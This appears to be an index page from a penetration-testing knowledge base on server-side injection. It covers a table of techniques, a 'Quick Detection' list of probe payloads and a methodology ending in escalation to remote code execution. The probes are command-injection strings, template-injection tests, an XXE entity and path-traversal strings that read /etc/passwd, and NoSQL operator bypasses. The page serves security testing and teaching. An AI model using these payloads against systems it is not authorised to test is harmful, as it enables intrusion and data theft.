---
tags:
  - critical
  - server-side
---

# Injection Vulnerabilities

Injection attacks exploit improper input handling to execute unintended commands, queries, or code on the server side.

## Categories

| Technique | Target | Impact |
|-----------|--------|--------|
| [Command Injection](command.md) | OS shell | RCE |
| [SSTI](ssti.md) | Template engines | RCE |
| [XXE](xxe.md) | XML parsers | File read, SSRF, RCE |
| [NoSQL Injection](nosql.md) | MongoDB, etc. | Auth bypass, data leak |
| [GraphQL](graphql.md) | GraphQL APIs | Data leak, DoS |
| [API Attacks](api.md) | REST/API endpoints | Auth bypass, rate limit bypass |
| [Path Traversal](path-traversal.md) | File system | Arbitrary file read |
| [File Upload](file-upload.md) | Upload handlers | RCE, XSS |

## Quick Detection

```bash
# Command Injection
; id
| whoami
$(id)

# SSTI
{{7*7}}
${7*7}
<%= 7*7 %>

# XXE
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>

# NoSQL
{"$ne": null}
{"$gt": ""}

# Path Traversal
../../../etc/passwd
..%2f..%2f..%2fetc%2fpasswd
```

## Methodology

1. **Identify input vectors** - Parameters, headers, file uploads, JSON bodies
2. **Determine technology** - Framework, language, database
3. **Test for injection** - Use detection payloads
4. **Confirm vulnerability** - Time-based, error-based, or OOB callbacks
5. **Escalate** - File read → SSRF → RCE
